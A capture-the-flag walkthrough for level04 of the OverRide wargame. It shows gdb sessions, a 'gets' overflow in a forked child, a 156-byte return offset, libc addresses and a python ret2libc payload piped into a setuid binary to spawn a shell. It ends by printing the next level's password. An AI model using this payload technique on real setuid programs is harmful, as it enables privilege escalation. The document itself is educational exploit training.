# Walkthrough

## Context

### Binary info

```bash
level04@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
level04@OverRide:~$ ./level04
Give me some shellcode, k
input
child is exiting...
level04@OverRide:~$ file ./level04
./level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
```

An elf binary compiled for Intel 80386 arch with level05's privileges

### Functions

```assembly
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x08048634  clear_stdin
0x08048657  get_unum
0x0804868f  prog_timeout
0x080486a0  enable_timeout_cons
0x080486c8  main
...
```

### Variables

```assembly
(gdb) info variables
All defined variables:

Non-debugging symbols:
...
```

No global variables

### 'main' disassembly

```assembly
(gdb) disas main
Dump of assembler code for function main:
...
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
...
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>
...
End of assembler dump.
```

Please refer to the [source.c](./source.c) for better understanding

So the main function uses 'fork' to clone the process. And after that the parent will just wait for child and the child will be using 'gets' function which is unprotected against buffer overflow attack. We can use it to perform a sub type of buffer overflow attack called 'return to libc' or 'ret2libc'.

## Exploit

Then, to perform a 'ret2libc' attack we need to understand how the call stack is working. Please refer to the [explanation](https://shellblade.net/files/docs/ret2libc.pdf). Basically we need 3 address, the function that will be executed on ret address, the function that will be served as ret address to the first function and the first function arguments. We will be using 'system', 'exit' and '/bin/sh' string address for this. But firstly we need to find the offset of ret address.

### Searching ret offset

```bash
level04@OverRide:~$ gdb -q ./level04
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04
[New process 2687]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2687]
0x41326641 in ?? ()
```

Don't forget to use 'set follow-fork-mode child' to follow the chid process

Our offset is 156. So we need to fill this with trash and then with actual addresses

### Searching needed address

```bash
level04@OverRide:~$ gdb -q ./level04
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) break *main
Breakpoint 1 at 0x80486c8
(gdb) run
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486c8 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

Note how we found '/bin/sh' string with 'find' command. Turns out that such a string already present near 'system' function address.

### Getting .pass

```bash
level04@OverRide:~$ python -c "print 156 * '.' + '0xf7e6aed0'[2:].decode('hex')[::-1] + '0xf7e5eb70'[2:].decode('hex')[::-1] + '0xf7f897ec'[2:].decode('hex')[::-1]" > /tmp/hack
level04@OverRide:~$ cat /tmp/hack - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```